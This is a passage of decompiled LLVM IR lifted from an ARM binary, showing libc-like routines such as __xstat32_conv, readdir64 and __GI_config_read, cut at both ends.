  %v1_172b0 = inttoptr i32 %v1_172ac to i32*
  %v2_172b0 = load i32, i32* %v1_172b0, align 4
  store i32 %v2_172b0, i32* %r7.global-to-local, align 4
  %v3_172b0 = add i32 %v0_172a8, 52
  %v4_172b0 = inttoptr i32 %v3_172b0 to i32*
  %v5_172b0 = load i32, i32* %v4_172b0, align 4
  store i32 %v5_172b0, i32* %r8.global-to-local, align 4
  %v1_172b4 = inttoptr i32 %v1_172a8 to i32*
  %v2_172b4 = load i32, i32* %v1_172b4, align 4
  %v3_172b4 = add i32 %v0_172a8, 84
  %v4_172b4 = inttoptr i32 %v3_172b4 to i32*
  %v5_172b4 = load i32, i32* %v4_172b4, align 4
  store i32 %v5_172b4, i32* %r1.global-to-local, align 4
  %v1_172b8 = add i32 %v0_172a8, 16
  %v2_172b8 = inttoptr i32 %v1_172b8 to i32*
  %v3_172b8 = load i32, i32* %v2_172b8, align 4
  store i32 %v3_172b8, i32* %r2.global-to-local, align 4
  %v0_172bc = load i32, i32* %r5.global-to-local, align 4
  %v1_172bc = add i32 %v0_172bc, 80
  %v1_172c0 = inttoptr i32 %v1_172bc to i32*
  store i32 %v2_172b4, i32* %v1_172c0, align 4
  %v3_172c0 = add i32 %v0_172bc, 84
  %v4_172c0 = inttoptr i32 %v3_172c0 to i32*
  %v5_172c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_172c0, i32* %v4_172c0, align 4
  %v0_172c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_172c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_172c4 = add i32 %v1_172c4, 48
  %v3_172c4 = inttoptr i32 %v2_172c4 to i32*
  store i32 %v0_172c4, i32* %v3_172c4, align 4
  %v0_172c8 = load i32, i32* %r8.global-to-local, align 4
  %v1_172c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_172c8 = add i32 %v1_172c8, 52
  %v3_172c8 = inttoptr i32 %v2_172c8 to i32*
  store i32 %v0_172c8, i32* %v3_172c8, align 4
  %v0_172cc = load i32, i32* %r2.global-to-local, align 4
  %v1_172cc = load i32, i32* %r5.global-to-local, align 4
  %v2_172cc = add i32 %v1_172cc, 16
  %v3_172cc = inttoptr i32 %v2_172cc to i32*
  store i32 %v0_172cc, i32* %v3_172cc, align 4
  %v0_172d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_172d0 = add i32 %v0_172d0, 88
  store i32 %v1_172d0, i32* %r3.global-to-local, align 4
  %v1_172d4 = add i32 %v0_172d0, 20
  %v2_172d4 = inttoptr i32 %v1_172d4 to i32*
  %v3_172d4 = load i32, i32* %v2_172d4, align 4
  store i32 %v3_172d4, i32* %r2.global-to-local, align 4
  %v1_172d8 = inttoptr i32 %v1_172d0 to i32*
  %v2_172d8 = load i32, i32* %v1_172d8, align 4
  %v3_172d8 = add i32 %v0_172d0, 92
  %v4_172d8 = inttoptr i32 %v3_172d8 to i32*
  %v5_172d8 = load i32, i32* %v4_172d8, align 4
  store i32 %v5_172d8, i32* %r1.global-to-local, align 4
  %v1_172dc = add i32 %v0_172d0, 64
  store i32 %v1_172dc, i32* %r6.global-to-local, align 4
  %v1_172e0 = inttoptr i32 %v1_172dc to i32*
  %v2_172e0 = load i32, i32* %v1_172e0, align 4
  store i32 %v2_172e0, i32* %r6.global-to-local, align 4
  %v3_172e0 = add i32 %v0_172d0, 68
  %v4_172e0 = inttoptr i32 %v3_172e0 to i32*
  %v5_172e0 = load i32, i32* %v4_172e0, align 4
  store i32 %v5_172e0, i32* %r7.global-to-local, align 4
  %v0_172e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_172e4 = add i32 %v0_172e4, 88
  store i32 %v1_172e4, i32* %r3.global-to-local, align 4
  %v2_172e8 = add i32 %v0_172e4, 20
  %v3_172e8 = inttoptr i32 %v2_172e8 to i32*
  store i32 %v3_172d4, i32* %v3_172e8, align 4
  %v0_172ec = load i32, i32* %ip.global-to-local, align 4
  %v1_172ec = load i32, i32* %r5.global-to-local, align 4
  %v2_172ec = add i32 %v1_172ec, 24
  %v3_172ec = inttoptr i32 %v2_172ec to i32*
  store i32 %v0_172ec, i32* %v3_172ec, align 4
  %v0_172f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_172f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_172f0 = add i32 %v1_172f0, 28
  %v3_172f0 = inttoptr i32 %v2_172f0 to i32*
  store i32 %v0_172f0, i32* %v3_172f0, align 4
  %v0_172f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_172f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_172f4 = add i32 %v1_172f4, 64
  %v3_172f4 = inttoptr i32 %v2_172f4 to i32*
  store i32 %v0_172f4, i32* %v3_172f4, align 4
  %v0_172f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_172f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_172f8 = add i32 %v1_172f8, 68
  %v3_172f8 = inttoptr i32 %v2_172f8 to i32*
  store i32 %v0_172f8, i32* %v3_172f8, align 4
  %v0_172fc = load i32, i32* %r3.global-to-local, align 4
  %v1_172fc = inttoptr i32 %v0_172fc to i32*
  store i32 %v2_172d8, i32* %v1_172fc, align 4
  %v3_172fc = add i32 %v0_172fc, 4
  %v4_172fc = inttoptr i32 %v3_172fc to i32*
  %v5_172fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_172fc, i32* %v4_172fc, align 4
  %v2_17300 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17300, i32* %r4.global-to-local, align 4
  ret i32 %v2_172d8

; uselistorder directives
  uselistorder i32 %v0_172d0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_172a8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_17308 = load i32, i32* @r4, align 4
  store i32 %v3_17308, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_17320 = inttoptr i32 %arg2 to i8*
  %v4_17320 = call i32 @__GI_memset(i8* %v3_17320, i32 0, i32 88)
  %v2_17324 = load i32, i32* %arg1, align 4
  %v3_17324 = add i32 %tmp, 4
  %v4_17324 = inttoptr i32 %v3_17324 to i32*
  %v5_17324 = load i32, i32* %v4_17324, align 4
  store i32 %v5_17324, i32* %r4.global-to-local, align 4
  %v0_17328 = load i32, i32* %r6.global-to-local, align 4
  %v1_17328 = inttoptr i32 %v0_17328 to i32*
  store i32 %v2_17324, i32* %v1_17328, align 4
  %v3_17328 = add i32 %v0_17328, 4
  %v4_17328 = inttoptr i32 %v3_17328 to i32*
  %v5_17328 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17328, i32* %v4_17328, align 4
  %v0_1732c = load i32, i32* %r5.global-to-local, align 4
  %v1_1732c = add i32 %v0_1732c, 32
  %v1_17330 = inttoptr i32 %v1_1732c to i32*
  %v2_17330 = load i32, i32* %v1_17330, align 4
  %v3_17330 = add i32 %v0_1732c, 36
  %v4_17330 = inttoptr i32 %v3_17330 to i32*
  %v5_17330 = load i32, i32* %v4_17330, align 4
  store i32 %v5_17330, i32* %r4.global-to-local, align 4
  %v1_17334 = add i32 %v0_1732c, 96
  %v2_17334 = inttoptr i32 %v1_17334 to i32*
  %v3_17334 = load i32, i32* %v2_17334, align 4
  store i32 %v3_17334, i32* %r2.global-to-local, align 4
  %v1_17338 = load i32, i32* %r6.global-to-local, align 4
  %v2_17338 = add i32 %v1_17338, 32
  %v3_17338 = inttoptr i32 %v2_17338 to i32*
  store i32 %v2_17330, i32* %v3_17338, align 4
  %v0_1733c = load i32, i32* %r4.global-to-local, align 4
  %v1_1733c = load i32, i32* %r6.global-to-local, align 4
  %v2_1733c = add i32 %v1_1733c, 36
  %v3_1733c = inttoptr i32 %v2_1733c to i32*
  store i32 %v0_1733c, i32* %v3_1733c, align 4
  %v0_17340 = load i32, i32* %r2.global-to-local, align 4
  %v1_17340 = load i32, i32* %r6.global-to-local, align 4
  %v2_17340 = add i32 %v1_17340, 12
  %v3_17340 = inttoptr i32 %v2_17340 to i32*
  store i32 %v0_17340, i32* %v3_17340, align 4
  %v0_17344 = load i32, i32* %r5.global-to-local, align 4
  %v1_17344 = add i32 %v0_17344, 48
  %v2_17344 = inttoptr i32 %v1_17344 to i32*
  %v3_17344 = load i32, i32* %v2_17344, align 4
  %v1_17348 = add i32 %v0_17344, 24
  store i32 %v1_17348, i32* %ip.global-to-local, align 4
  %v1_1734c = inttoptr i32 %v1_17348 to i32*
  %v2_1734c = load i32, i32* %v1_1734c, align 4
  store i32 %v2_1734c, i32* %ip.global-to-local, align 4
  %v3_1734c = add i32 %v0_17344, 28
  %v4_1734c = inttoptr i32 %v3_1734c to i32*
  %v5_1734c = load i32, i32* %v4_1734c, align 4
  store i32 %v5_1734c, i32* %lr.global-to-local, align 4
  %v1_17350 = load i32, i32* %r6.global-to-local, align 4
  %v2_17350 = add i32 %v1_17350, 44
  %v3_17350 = inttoptr i32 %v2_17350 to i32*
  store i32 %v3_17344, i32* %v3_17350, align 4
  %v0_17354 = load i32, i32* %r5.global-to-local, align 4
  %v1_17354 = add i32 %v0_17354, 64
  %v2_17354 = inttoptr i32 %v1_17354 to i32*
  %v3_17354 = load i32, i32* %v2_17354, align 4
  %v1_17358 = add i32 %v0_17354, 56
  %v2_17358 = inttoptr i32 %v1_17358 to i32*
  %v3_17358 = load i32, i32* %v2_17358, align 4
  store i32 %v3_17358, i32* %r2.global-to-local, align 4
  %v1_1735c = load i32, i32* %r6.global-to-local, align 4
  %v2_1735c = add i32 %v1_1735c, 52
  %v3_1735c = inttoptr i32 %v2_1735c to i32*
  store i32 %v3_17354, i32* %v3_1735c, align 4
  %v0_17360 = load i32, i32* %r2.global-to-local, align 4
  %v1_17360 = load i32, i32* %r6.global-to-local, align 4
  %v2_17360 = add i32 %v1_17360, 48
  %v3_17360 = inttoptr i32 %v2_17360 to i32*
  store i32 %v0_17360, i32* %v3_17360, align 4
  %v0_17364 = load i32, i32* %r5.global-to-local, align 4
  %v1_17364 = add i32 %v0_17364, 72
  %v1_17368 = inttoptr i32 %v1_17364 to i32*
  %v2_17368 = load i32, i32* %v1_17368, align 4
  %v3_17368 = add i32 %v0_17364, 76
  %v4_17368 = inttoptr i32 %v3_17368 to i32*
  %v5_17368 = load i32, i32* %v4_17368, align 4
  store i32 %v5_17368, i32* %r1.global-to-local, align 4
  %v0_1736c = load i32, i32* %r6.global-to-local, align 4
  %v1_1736c = add i32 %v0_1736c, 56
  %v1_17370 = inttoptr i32 %v1_1736c to i32*
  store i32 %v2_17368, i32* %v1_17370, align 4
  %v3_17370 = add i32 %v0_1736c, 60
  %v4_17370 = inttoptr i32 %v3_17370 to i32*
  %v5_17370 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17370, i32* %v4_17370, align 4
  %v0_17374 = load i32, i32* %r5.global-to-local, align 4
  %v1_17374 = add i32 %v0_17374, 80
  %v1_17378 = inttoptr i32 %v1_17374 to i32*
  %v2_17378 = load i32, i32* %v1_17378, align 4
  %v3_17378 = add i32 %v0_17374, 84
  %v4_17378 = inttoptr i32 %v3_17378 to i32*
  %v5_17378 = load i32, i32* %v4_17378, align 4
  store i32 %v5_17378, i32* %r1.global-to-local, align 4
  %v0_1737c = load i32, i32* %r6.global-to-local, align 4
  %v1_1737c = add i32 %v0_1737c, 64
  %v1_17380 = inttoptr i32 %v1_1737c to i32*
  store i32 %v2_17378, i32* %v1_17380, align 4
  %v3_17380 = add i32 %v0_1737c, 68
  %v4_17380 = inttoptr i32 %v3_17380 to i32*
  %v5_17380 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17380, i32* %v4_17380, align 4
  %v0_17384 = load i32, i32* %r5.global-to-local, align 4
  %v1_17384 = add i32 %v0_17384, 16
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  %v1_17388 = load i32, i32* %r6.global-to-local, align 4
  %v2_17388 = add i32 %v1_17388, 16
  %v3_17388 = inttoptr i32 %v2_17388 to i32*
  store i32 %v3_17384, i32* %v3_17388, align 4
  %v0_1738c = load i32, i32* %r5.global-to-local, align 4
  %v1_1738c = add i32 %v0_1738c, 88
  %v1_17390 = add i32 %v0_1738c, 20
  %v2_17390 = inttoptr i32 %v1_17390 to i32*
  %v3_17390 = load i32, i32* %v2_17390, align 4
  store i32 %v3_17390, i32* %r2.global-to-local, align 4
  %v1_17394 = inttoptr i32 %v1_1738c to i32*
  %v2_17394 = load i32, i32* %v1_17394, align 4
  %v3_17394 = add i32 %v0_1738c, 92
  %v4_17394 = inttoptr i32 %v3_17394 to i32*
  %v5_17394 = load i32, i32* %v4_17394, align 4
  store i32 %v5_17394, i32* %r1.global-to-local, align 4
  %v0_17398 = load i32, i32* %r6.global-to-local, align 4
  %v1_17398 = add i32 %v0_17398, 72
  %v1_1739c = inttoptr i32 %v1_17398 to i32*
  store i32 %v2_17394, i32* %v1_1739c, align 4
  %v3_1739c = add i32 %v0_17398, 76
  %v4_1739c = inttoptr i32 %v3_1739c to i32*
  %v5_1739c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1739c, i32* %v4_1739c, align 4
  %v0_173a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_173a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_173a0 = add i32 %v1_173a0, 20
  %v3_173a0 = inttoptr i32 %v2_173a0 to i32*
  store i32 %v0_173a0, i32* %v3_173a0, align 4
  %v0_173a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_173a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_173a4 = add i32 %v1_173a4, 24
  %v3_173a4 = inttoptr i32 %v2_173a4 to i32*
  store i32 %v0_173a4, i32* %v3_173a4, align 4
  %v0_173a8 = load i32, i32* %lr.global-to-local, align 4
  %v1_173a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_173a8 = add i32 %v1_173a8, 28
  %v3_173a8 = inttoptr i32 %v2_173a8 to i32*
  store i32 %v0_173a8, i32* %v3_173a8, align 4
  %v2_173ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_173ac, i32* %r4.global-to-local, align 4
  ret i32 %v2_17394

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r6, align 4
  %v1_173c8 = add i32 %tmp, 24
  store i32 %v1_173c8, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_173e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  store i32 %v4_173e0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_173e0)
  %v0_173f4 = load i32, i32* @r6, align 4
  %v2_173f4 = add i32 %v0_173f4, 16
  %v3_173f4 = inttoptr i32 %v2_173f4 to i32*
  %v4_173f4 = load i32, i32* %v3_173f4, align 4
  store i32 %v4_173f4, i32* %ip.global-to-local, align 4
  store i32 95232, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_173f4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_17434, %entry
  %v0_17404 = load i32, i32* @r5, align 4
  %v1_17404 = add i32 %v0_17404, 4
  %v2_17404 = inttoptr i32 %v1_17404 to i32*
  %v3_17404 = load i32, i32* %v2_17404, align 4
  %v4_17404 = add i32 %v0_17404, 8
  %v5_17404 = inttoptr i32 %v4_17404 to i32*
  %v6_17404 = load i32, i32* %v5_17404, align 4
  %tmp10 = icmp ugt i32 %v6_17404, %v3_17404
  br i1 %tmp10, label %dec_label_pc_17434, label %dec_label_pc_17410

dec_label_pc_17410:                               ; preds = %dec_label_pc_17404
  %v1_17410 = inttoptr i32 %v0_17404 to i32*
  %v2_17410 = load i32, i32* %v1_17410, align 4
  %v1_17414 = add i32 %v0_17404, 12
  %v2_17414 = inttoptr i32 %v1_17414 to i32*
  %v3_17414 = load i32, i32* %v2_17414, align 4
  %v1_17418 = add i32 %v0_17404, 20
  %v2_17418 = inttoptr i32 %v1_17418 to i32*
  %v3_17418 = load i32, i32* %v2_17418, align 4
  %v4_1741c = inttoptr i32 %v3_17414 to i32*
  %v5_1741c = call i32 @__getdents64(i32 %v2_17410, i32* %v4_1741c, i32 %v3_17418, i32 %v6_17404)
  %tmp9 = icmp slt i32 %v5_1741c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1742c

.thread:                                          ; preds = %dec_label_pc_17410
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_17464

dec_label_pc_1742c:                               ; preds = %dec_label_pc_17410
  %v1_1742c = load i32, i32* @r5, align 4
  %v2_1742c = add i32 %v1_1742c, 8
  %v3_1742c = inttoptr i32 %v2_1742c to i32*
  store i32 %v5_1741c, i32* %v3_1742c, align 4
  %v0_17430 = load i32, i32* @r7, align 4
  %v1_17430 = load i32, i32* @r5, align 4
  %v2_17430 = add i32 %v1_17430, 4
  %v3_17430 = inttoptr i32 %v2_17430 to i32*
  store i32 %v0_17430, i32* %v3_17430, align 4
  %v0_17434.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17434

dec_label_pc_17434:                               ; preds = %dec_label_pc_17404, %dec_label_pc_1742c
  %v1_17458 = phi i32 [ %v0_17404, %dec_label_pc_17404 ], [ %v0_17434.pre, %dec_label_pc_1742c ]
  %v1_17434 = add i32 %v1_17458, 4
  %v2_17434 = inttoptr i32 %v1_17434 to i32*
  %v3_17434 = load i32, i32* %v2_17434, align 4
  %v1_17438 = add i32 %v1_17458, 12
  %v2_17438 = inttoptr i32 %v1_17438 to i32*
  %v3_17438 = load i32, i32* %v2_17438, align 4
  %v2_1743c = add i32 %v3_17438, %v3_17434
  store i32 %v2_1743c, i32* @r4, align 4
  %v3_17440 = inttoptr i32 %v2_1743c to i32*
  %v4_17440 = load i32, i32* %v3_17440, align 4
  %v1_17444 = add i32 %v2_1743c, 4
  %v2_17444 = inttoptr i32 %v1_17444 to i32*
  %v3_17444 = load i32, i32* %v2_17444, align 4
  %v1_17448 = add i32 %v2_1743c, 16
  %v2_17448 = inttoptr i32 %v1_17448 to i16*
  %v3_17448 = load i16, i16* %v2_17448, align 2
  %v4_17448 = zext i16 %v3_17448 to i32
  %v1_1744c = add i32 %v2_1743c, 8
  %v2_1744c = inttoptr i32 %v1_1744c to i32*
  %v3_1744c = load i32, i32* %v2_1744c, align 4
  store i32 %v3_1744c, i32* %ip.global-to-local, align 4
  %v2_17450 = add i32 %v4_17448, %v3_17434
  %v2_17454 = or i32 %v3_17444, %v4_17440
  %v4_17454 = icmp eq i32 %v2_17454, 0
  store i32 %v2_17450, i32* %v2_17434, align 4
  %v0_1745c = load i32, i32* %ip.global-to-local, align 4
  %v1_1745c = load i32, i32* @r5, align 4
  %v2_1745c = add i32 %v1_1745c, 16
  %v3_1745c = inttoptr i32 %v2_1745c to i32*
  store i32 %v0_1745c, i32* %v3_1745c, align 4
  br i1 %v4_17454, label %dec_label_pc_17404, label %dec_label_pc_17464

dec_label_pc_17464:                               ; preds = %dec_label_pc_17434, %.thread
  %v0_17470 = load i32, i32* @r6, align 4
  %v2_17470 = add i32 %v0_17470, 44
  %v3_17470 = inttoptr i32 %v2_17470 to i32*
  %v4_17470 = load i32, i32* %v3_17470, align 4
  store i32 %v4_17470, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17470)
  %v0_1747c = load i32, i32* @r4, align 4
  ret i32 %v0_1747c

; uselistorder directives
  uselistorder i32 %v2_1743c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_17458, { 1, 0 }
  uselistorder i32 %v6_17404, { 1, 0 }
  uselistorder i32 %v0_17404, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_17434, { 1, 0 }
}

define i32 @function_17490(i32 %arg1) local_unnamed_addr {
dec_label_pc_17490:
  %v0_17490 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17490, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17490
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17490, %bb
  %v4_1749c = phi i32 [ %arg1, %dec_label_pc_17490 ], [ 0, %bb ]
  ret i32 %v4_1749c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_174a0 = load i32, i32* @r4, align 4
  %v6_174a0 = load i32, i32* @r5, align 4
  %v9_174a0 = load i32, i32* @r6, align 4
  %v12_174a0 = load i32, i32* @r7, align 4
  %v15_174a0 = load i32, i32* @r8, align 4
  %v18_174a0 = load i32, i32* @sb, align 4
  %v21_174a0 = load i32, i32* @sl, align 4
  %v24_174a0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_174a4 = icmp eq i32* %arg1, null
  store i1 %v2_174a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_174a4, label %dec_label_pc_177b4, label %dec_label_pc_174bc

dec_label_pc_174bc:                               ; preds = %entry
  %v1_174bc = urem i32 %arg3, 256
  store i32 %v1_174bc, i32* @sb, align 4
  %v1_174c0 = udiv i32 %arg3, 256
  %v3_174c4 = urem i32 %v1_174c0, 256
  %v3_174c8 = mul nuw nsw i32 %v1_174bc, 4
  %v1_174d0 = or i32 %v3_174c8, 1
  %v1_174dc = and i32 %arg3, 131072
  %v1_174e0 = add nsw i32 %v1_174bc, -1
  %v1_174ec = and i32 %arg3, 262144
  store i32 %v1_174ec, i32* %r2.global-to-local, align 4
  %v1_174f0 = and i32 %arg3, 65536
  store i32 %v1_174f0, i32* %r3.global-to-local, align 4
  store i32 %v1_174f0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_17500 = add i32 %arg4, 1
  store i32 %v1_17500, i32* @sl, align 4
  %v2_17678 = icmp eq i32 %v1_174dc, 0
  %v1_176d0 = inttoptr i32 %arg2 to i32*
  %v2_176e8 = icmp eq i32 %v1_174ec, 0
  br label %dec_label_pc_17504

dec_label_pc_17504:                               ; preds = %dec_label_pc_17504.backedge, %dec_label_pc_174bc
  %v2_17520 = phi i32 [ %v0_17504.pre, %dec_label_pc_17504.backedge ], [ %tmp, %dec_label_pc_174bc ]
  %v1_17504 = add i32 %v2_17520, 4
  %v2_17504 = inttoptr i32 %v1_17504 to i32*
  %v3_17504 = load i32, i32* %v2_17504, align 4
  store i32 %v3_17504, i32* %r3.global-to-local, align 4
  %v2_17508 = icmp eq i32 %v3_17504, 0
  store i1 %v2_17508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17508, label %dec_label_pc_17510, label %dec_label_pc_17558

dec_label_pc_17510:                               ; preds = %dec_label_pc_17504
  %v1_17510 = add i32 %v2_17520, 16
  %v2_17510 = inttoptr i32 %v1_17510 to i32*
  %v3_17510 = load i32, i32* %v2_17510, align 4
  store i32 %v3_17510, i32* %r3.global-to-local, align 4
  %v2_17514 = icmp eq i32 %v3_17510, 0
  store i1 %v2_17514, i1* %cpsr_z.global-to-local, align 1
  %v1_17518 = add i32 %v2_17520, 8
  %v2_17518 = inttoptr i32 %v1_17518 to i32*
  %v3_17518 = load i32, i32* %v2_17518, align 4
  store i32 %v3_17518, i32* %r3.global-to-local, align 4
  br i1 %v2_17514, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_17510
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_17510, align 4
  %v0_17524.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_17510, %bb
  %v0_17524 = phi i32 [ %v0_17524.pre, %bb ], [ %v3_17518, %dec_label_pc_17510 ]
  %v2_17524 = icmp eq i32 %v0_17524, 0
  store i1 %v2_17524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17524, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_174d0, i32* %r3.global-to-local, align 4
  %v2_1752c = load i32, i32* @r5, align 4
  %v3_1752c = add i32 %v2_1752c, 8
  %v4_1752c = inttoptr i32 %v3_1752c to i32*
  store i32 %v1_174d0, i32* %v4_1752c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_17530 = load i32, i32* @r5, align 4
  %v1_17530 = add i32 %v0_17530, 16
  %v2_17530 = inttoptr i32 %v1_17530 to i32*
  %v3_17530 = load i32, i32* %v2_17530, align 4
  store i32 %v3_17530, i32* %r0.global-to-local, align 4
  %v1_17534 = add i32 %v0_17530, 8
  %v2_17534 = inttoptr i32 %v1_17534 to i32*
  %v3_17534 = load i32, i32* %v2_17534, align 4
  store i32 %v3_17534, i32* %r3.global-to-local, align 4
  %v2_17538 = add i32 %v3_17534, %v3_17530
  store i32 %v2_17538, i32* @r0, align 4
  %v0_1753c = call i32 @malloc()
  store i32 %v0_1753c, i32* %r0.global-to-local, align 4
  %v2_17540 = icmp eq i32 %v0_1753c, 0
  store i1 %v2_17540, i1* %cpsr_z.global-to-local, align 1
  %v1_17544 = load i32, i32* @r5, align 4
  %v2_17544 = add i32 %v1_17544, 4
  %v3_17544 = inttoptr i32 %v2_17544 to i32*
  store i32 %v0_1753c, i32* %v3_17544, align 4
  br i1 %v2_17540, label %dec_label_pc_177b4, label %dec_label_pc_1754c

dec_label_pc_1754c:                               ; preds = %.thread
  %v0_1754c = load i32, i32* @r5, align 4
  %v1_1754c = add i32 %v0_1754c, 20
  %v2_1754c = inttoptr i32 %v1_1754c to i32*
  %v3_1754c = load i32, i32* %v2_1754c, align 4
  %v1_17550 = or i32 %v3_1754c, 1
  store i32 %v1_17550, i32* %r3.global-to-local, align 4
  store i32 %v1_17550, i32* %v2_1754c, align 4
  %v0_17558.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17558

dec_label_pc_17558:                               ; preds = %dec_label_pc_17504, %dec_label_pc_1754c
  %v1_17560 = phi i32 [ %v2_17520, %dec_label_pc_17504 ], [ %v0_17558.pre, %dec_label_pc_1754c ]
  %v1_17558 = add i32 %v1_17560, 4
  %v2_17558 = inttoptr i32 %v1_17558 to i32*
  %v3_17558 = load i32, i32* %v2_17558, align 4
  store i32 %v3_17558, i32* %r2.global-to-local, align 4
  %v4_17558 = add i32 %v1_17560, 8
  %v5_17558 = inttoptr i32 %v4_17558 to i32*
  %v6_17558 = load i32, i32* %v5_17558, align 4
  %v2_1755c = add i32 %v6_17558, %v3_17558
  store i32 %v2_1755c, i32* %r3.global-to-local, align 4
  %v2_17560 = add i32 %v1_17560, 12
  %v3_17560 = inttoptr i32 %v2_17560 to i32*
  store i32 %v2_1755c, i32* %v3_17560, align 4
  %v0_17564 = load i32, i32* @fp, align 4
  store i32 %v0_17564, i32* @r6, align 4
  br label %dec_label_pc_17568

dec_label_pc_17568:                               ; preds = %dec_label_pc_175f4, %dec_label_pc_175e0, %dec_label_pc_17558
  %v0_17570 = phi i32 [ %v0_17564, %dec_label_pc_17558 ], [ %v1_175e0, %dec_label_pc_175e0 ], [ %v0_17570.pre.pre, %dec_label_pc_175f4 ]
  %v0_17568 = load i32, i32* @r5, align 4
  %v1_17568 = add i32 %v0_17568, 12
  store i32 %v1_17568, i32* %r0.global-to-local, align 4
  %v1_1756c = inttoptr i32 %v1_17568 to i32*
  %v2_1756c = load i32, i32* %v1_1756c, align 4
  store i32 %v2_1756c, i32* %r0.global-to-local, align 4
  %v3_1756c = add i32 %v0_17568, 16
